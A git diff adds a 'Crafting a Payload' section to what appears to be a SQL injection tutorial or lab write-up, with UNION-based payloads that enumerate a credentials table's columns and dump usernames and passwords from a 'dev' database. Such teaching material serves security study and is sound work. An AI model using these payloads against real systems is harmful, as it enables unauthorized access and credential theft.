@@ -856,4 +856,16 @@ As in the previous example, the query can be refined to only pull columns from a
 cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'--    
 ```
 
+---
+
 ### Crafting a Payload
+
+The groundwork has been laid and it is now time to exploit the target. Based on the previous steps, the attacker has decided to target the `dev` database. The goal is to dump all data from the `username` and `password` columns in the `credentials` table. 
+
+The following payload should do the trick:
+
+```sql
+cn' UNION SELECT 1, username, password, 4 FROM dev.credentials--  
+```
+
+![Filtered output](images/payload.png)
